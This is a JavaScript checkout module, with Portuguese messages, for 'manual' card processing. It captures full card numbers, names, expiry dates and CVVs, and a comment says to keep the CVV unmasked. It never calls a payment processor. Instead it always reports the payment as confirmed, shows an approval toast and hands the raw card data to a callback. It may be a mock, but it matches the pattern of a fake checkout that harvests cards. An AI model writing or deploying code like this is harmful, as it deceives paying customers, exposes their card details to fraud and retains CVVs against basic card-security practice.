
import { randomId, simulateProcessingDelay } from '../common/paymentUtils';

export const processManual = async ({
  cardData,
  formState,
  navigate,
  setIsSubmitting,
  setError,
  toast,
  onSubmit,
  brand
}) => {
  try {
    console.log("Using manual card processing with data:", { 
      ...cardData, 
      // Don't log full CVV in logs
      cvv: '***'
    });
    
    // Store the full CVV (don't mask it here)
    const paymentData = {
      cardNumber: cardData.cardNumber.replace(/\s/g, ''),
      expiryMonth: cardData.expiryMonth,
      expiryYear: cardData.expiryYear,
      cvv: cardData.cvv, // Use full CVV
      cardName: cardData.cardName,
      paymentId: `pay_${randomId(10)}`,
      status: 'CONFIRMED',
      brand: brand || 'Desconhecida'
    };

    // Simulate a successful payment
    await simulateProcessingDelay(2000);
    
    if (onSubmit) {
      onSubmit(paymentData);
    }
    
    if (toast) {
      toast({
        title: "Pagamento aprovado",
        description: "Seu pagamento foi processado com sucesso.",
        duration: 5000,
      });
    }
    
    // Navigate to success page
    navigate('/payment-success', { 
      state: { 
        ...formState,
        paymentMethod: 'card',
        orderId: paymentData.paymentId
      }
    });

    return {
      method: 'card',
      paymentId: paymentData.paymentId,
      status: paymentData.status,
      timestamp: new Date().toISOString(),
      brand: paymentData.brand
    };
  } catch (error) {
    console.error('Erro no processamento manual do cartão:', error);
    setError('Erro ao processar pagamento. Por favor, tente novamente.');
    
    if (toast) {
      toast({
        title: "Erro no processamento",
        description: "Houve um problema ao processar o pagamento. Por favor, tente novamente.",
        variant: "destructive",
        duration: 5000,
      });
    }
  } finally {
    setIsSubmitting(false);
  }
};
